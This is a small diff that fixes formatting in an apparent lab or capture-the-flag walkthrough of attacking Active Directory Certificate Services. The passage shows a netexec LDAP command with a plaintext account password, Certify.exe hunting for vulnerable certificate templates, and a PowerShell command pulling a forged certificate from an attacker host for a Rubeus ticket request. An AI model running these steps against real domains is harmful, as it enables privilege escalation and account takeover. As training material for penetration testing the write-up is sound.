@@ -263,7 +263,7 @@ sudo nxc ldap $IP -u ryan.cooper -p NuclearMosquito3 -M adcs
 **Finding Vulnerabilities:**
 
 ```bash
-**.**\Certify.exe find /vulnerable /currentuser
+.\Certify.exe find /vulnerable /currentuser
 ```
 
 ![image.png](image%2021.png)
@@ -290,7 +290,7 @@ Copy the  `-----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE-----` sect
 Finally, move the cert.pfx to your target machine filesystem (manually or through Cobalt Strike), and request a TGT for the `altname` user using Rubeus:
 
 ```bash
-iwr -uri [http://10.10.14.6/cert.pfx](http://10.10.14.6/cert.pfx) -Outfile cert.pfx
+iwr -uri http://10.10.14.6/cert.pfx -Outfile cert.pfx
 ```
 
 ```bash
